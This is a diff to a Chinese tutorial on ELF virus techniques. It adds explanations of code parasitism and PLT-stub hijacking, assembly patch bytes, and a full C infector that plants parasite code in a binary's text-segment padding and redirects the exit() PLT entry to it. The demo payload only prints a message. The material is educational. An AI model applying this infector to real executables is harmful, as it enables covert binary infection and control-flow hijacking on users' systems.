@@ -4343,6 +4343,7 @@ long _ptrace(long request, long pid, void *addr, void *data)
 
 *Viruses don't harm, ignorance does!*
 
+这一章节的内容中，将会先介绍常见的代码寄生技术，也就是在宿主程序的二进制文件中找到一块合理的区域来存放我们的代码；然后会介绍如何劫持控制流，让宿主程序能够执行我们寄生的代码；最后会介绍一些进程感染的方法，这和前面所介绍的代码注入有些类似，但是这里将会进行更加详细的介绍。
 
 
 ### ELF病毒简述
@@ -5207,14 +5208,276 @@ int main(int argc, char *argv[])
 
 ### 感染控制流
 
-在前面内容中介绍了一些常见的代码寄生方法，将一段寄生代码放在宿主文件中某段不会不使用到的位置，然后将宿主程序的程序入口点改为寄生代码所在的位置，然后寄生代码的需要跳转到宿主原来的程序入口点继续执行。
+在前面内容中介绍了一些常见的代码寄生方法，也就是在宿主文件中找到一块合理的位置来寄生我们的代码，然后将宿主程序的程序入口点改为寄生代码所在的位置，然后寄生代码的需要跳转到宿主原来的程序入口点继续执行。
 
 但是并不总是想要宿主在一开始就执行寄生代码，并且直接修改程序入口点的感染方式还不够隐蔽。
 
-而寄生代码通常就是一个单独的函数，感染二进制文件的目的就是希望字节的寄生函数代替二进制文件中的某个已有的函数执行，就比如前面介绍的例子中，我们希望寄生代码能够代替宿主程序中的_start()函数执行，这就是函数劫持。
+而寄生代码通常就是一个单独的函数，感染二进制文件的目的就是希望字节的寄生函数代替二进制文件中的某个已有的函数执行，就比如前面介绍的例子中，我们希望寄生代码能够代替宿主程序中的_start()函数执行，这就是一种简单函数劫持。
 
-这里将会介绍一个宿主程序中可供攻击者进行函数劫持的攻击点。
+在这部分的内容中，将会介绍如何劫持宿主程序的控制流，将宿主程序的控制流转移到寄生代码的位置上去执行。
+
+这里先简要介绍一下宿主程序中可供攻击者进行函数劫持的攻击点。
 
 ![infect_control_flow](./image/infect_control_flow.png)
 
-上图演示了一个二进制文件中可供控制流感染的点，下面将会对这些可感染的点进行详细介绍。
+上图演示了一个二进制文件中可供控制流感染的点，而后面将会对这些可感染的点进行详细介绍。
+
+#### 直接PLT感染
+
+这又是也会被称为 PLT 钩子。在前面讨论程序的动态链接时已经讨论过了 PLT 和 GOT 的作用及其工作流程，\<func\>@plt 中保存了每个共享库函数的入口，位于.plt.sec节中，在前面的介绍中我们将其称为共享库函数的存根，这个存根中的代码会间接跳转到保存在GOT中的地址，如果 GOT 中的地址还未解析（首次调用），那么就会跳转到 .plt 节执行， .plt 节中的代码会以需要解析的共享库函数的索引以及其他参数调用动态连接器进行目标函数地址的解析。
+
+这里所讨论的直接PLT感染是指直接共享库函数的PLT存根，使其跳转到寄生代码的地址去执行，这样的话，宿主程序对共享库函数的调用都会转换成对寄生代码的调用。
+
+```assembly
+0000000000401050 <puts@plt>:
+  401050:	f3 0f 1e fa          	endbr64 
+  401054:	f2 ff 25 bd 2f 00 00 	bnd jmp *0x2fbd(%rip)        # 404018 <puts@GLIBC_2.2.5>
+  40105b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+```
+上面的汇编代码是puts() 函数对应的PLT存根，除了第一条 `endbr64` 指令外，后面的一条指令就是一条间接跳转指令，这条间接跳转指令有 7 个字节的长度，那么我们可以将这条指令替换成下面这条指令：
+
+```assembly
+push $0x000000  # patch it with the address of parasite code
+ret             # pop up address and jmp to it
+```
+
+上面的这条指令会将宿主程序的控制转移到寄生代码处，并且这条指令会被编码成 "\x68\x00\x00\x00\x00\xc3"，一共6个字节，或者使用下面的指令：
+
+```assembly
+mov $0x000000, %eax
+jmp *%eax
+```
+
+上面这样的汇编代码会被编码成"\xb8\x00\x00\x00\x00\xff\xe0"，一共7个字节。
+
+所以可以注入到 puts() 函数的存根中，从而使寄生代码劫持所有的puts()函数。
+
+下面我们将补齐前面所写的感染程序，将寄生代码写到宿主程序的text段填充区，然后劫持宿主程序对exit()函数的调用，从而执行寄生代码。
+
+代码实现如下：
+
+##### PLT redirection infect
+
+```c
+/* plt_redirection_infect.c 
+ * redirect the PLT entry to hijack the control flow.
+ * Our code was parasited in the padding area of text segment.
+ * Usage: ./plt_redirection_infect <host_file> 
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <errno.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <stdint.h>
+#include <elf.h>
+#include <fcntl.h>
+#include <string.h>
+
+typedef struct _handle_t
+{
+    uint8_t *mem;
+    Elf64_Ehdr *ehdr;
+    Elf64_Phdr *phdr;
+    Elf64_Shdr *shdr;
+    char *shrtable;
+}handle_t;
+
+static volatile inline void 
+_write(int, char *, unsigned int)__attribute__((aligned(8), __always_inline__));
+
+static volatile inline void
+_write(int fd, char *buffer, unsigned int len)
+{
+    __asm__ volatile(
+        /* write(1, "[I'm in here]\n", 14) */
+        "mov %0, %%edi\n"
+        "mov %1, %%rsi\n"
+        "mov %2, %%edx\n"
+        "mov $1, %%rax\n"
+        "syscall\n"
+        
+        /* exit(0) */
+        "mov $0, %%edi\n"
+        "mov $60, %%rax\n"
+        "syscall\n"
+        : 
+        : "g"(fd), "g"(buffer), "g"(len)
+    );
+}
+
+void parasite_greeting()
+{
+    char str[] = {'[', 'I', '\'', 'm', 
+    ' ', 'i', 'n', ' ', 'h', 'e', 'r', 'e', ']','\n', '\0'};
+    _write(1, str, 14);
+    
+    /*
+    __asm__ volatile(
+        "mov $0x401178, %%rax\n"
+        "jmp *%%rax\n"
+        :
+        : 
+    );
+    */
+}
+
+uint8_t *create_shellcode(void (*fn)(),size_t len)
+{
+    int i;
+    uint8_t *mem = malloc(len);
+    uint8_t *ptr = (uint8_t *)fn;
+    for(i = 0; i < len; i++) mem[i] = ptr[i];
+    return mem;
+}
+
+uint64_t f1 = (uint64_t)parasite_greeting;
+uint64_t f2 = (uint64_t)create_shellcode;
+
+int main(int argc, char *argv[])
+{
+    if(argc < 2)
+    {
+        printf("Usage: %s <exec_file>\n", argv[0]);
+        exit(-1);
+    }
+    handle_t h;
+    size_t parasite_len = ((f2 - f1) + 7) & (~7);
+    uint8_t *parasite_code = create_shellcode(parasite_greeting, parasite_len);
+
+    char *file_name = strdup(argv[1]);
+    int fd;
+    if((fd = open(file_name, O_RDWR)) < 0)
+    {
+        perror("open");
+        exit(-1);
+    }
+    struct stat st;
+    if(fstat(fd, &st) < 0)
+    {
+        perror("fstat");
+        exit(-1);
+    }
+    h.mem = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
+    
+    if(h.mem == MAP_FAILED)
+    {
+        perror("mmap");
+        exit(-1);
+    }
+    
+    h.ehdr = (Elf64_Ehdr *)h.mem;
+    h.phdr = (Elf64_Phdr *)&h.mem[h.ehdr->e_phoff];
+    h.shdr = (Elf64_Shdr *)&h.mem[h.ehdr->e_shoff];
+    
+    Elf64_Off parasite_offset;
+    Elf64_Addr parasite_entry;
+    int i;
+    for(i = 0; i < h.ehdr->e_phnum; i++)
+    {
+        if((h.phdr[i].p_type == PT_LOAD) && (h.phdr[i].p_flags == PF_R + PF_X))
+        {
+            parasite_offset = h.phdr[i].p_offset + h.phdr[i].p_filesz; 
+            parasite_entry = h.phdr[i].p_vaddr + h.phdr[i].p_memsz;
+            h.phdr[i].p_filesz += parasite_len;
+            h.phdr[i].p_memsz += parasite_len;
+        }
+    }
+
+    h.shrtable = &h.mem[h.shdr[h.ehdr->e_shstrndx].sh_offset];
+    
+    size_t hijack_offset;
+
+    for(i = 0; i < h.ehdr->e_shnum; i++)
+    {
+        if(h.shdr[i].sh_offset + h.shdr[i].sh_size == parasite_offset)
+            h.shdr[i].sh_size += parasite_len;
+        if(strcmp(&h.shrtable[h.shdr[i].sh_name], ".plt.sec") == 0)
+        {
+            hijack_offset = h.shdr[i].sh_offset + h.shdr[i].sh_entsize + 4;
+            printf("Got the .plt.sec offset at %lx\n", hijack_offset);
+        }
+    }
+    uint8_t *hijack_code = {"\x68\x00\x00\x00\x00\xc3\x90"};
+    
+    if(lseek(fd, 0, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, h.mem, sizeof(Elf64_Ehdr) + h.ehdr->e_phentsize * h.ehdr->e_phnum) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    if(lseek(fd, hijack_offset, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, hijack_code, 7) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    if(lseek(fd, hijack_offset + 1, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, &parasite_entry, 4) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    if(lseek(fd, parasite_offset, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, parasite_code, parasite_len) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    if(lseek(fd, h.ehdr->e_shoff, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, h.shdr, h.ehdr->e_shentsize * h.ehdr->e_shnum) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    close(fd);
+    return 0;
+}
+```
+
+上面的代码会劫持宿主程序的第二个共享库函数的存根，在这个实验中是exit()函数对应的plt存根，所以宿主程序在调用exit()函数时会跳转到寄生代码执行，如下图所示：
+
+![plt_redirection_result](./image/plt_redirection_result.png)
+
+宿主程序的.plt.sec节在被感染之前的内容如下图所示：
+
+![plt_redirection_before](./image/plt_redirection_before.png)
+
+在被感染之后的内容如下图所示：
+
+![plt_redirection_then](./image/plt_redirection_then.png)
+
+可以看到原来的exit()函数对应的plt存根被替换成了别的内容，而当宿主程序调用exit()函数时，将会跳转到的寄生代码的位置执行。
+
+#### 函数蹦床
+
+函数蹦床和前面的直接PLT感染其实有点类似，只不过函数蹦床是在想要劫持的函数中写入跳转指令，将控制转移到寄生到的地址，从而实现函数劫持。
+
+实际上，共享库函数的PLT存根也就相当于是一个函数，所以前面所说的PLT直接感染相当与是一个劫持共享库函数的PLT存根的函数蹦床。
+
+不过想要精确劫持某个函数的调用，实现起来会比较复杂，因为定位函数的地址需要依赖宿主程序的符号表和字符串表。
+
+#### 重写.ctors/dtors 指针
+
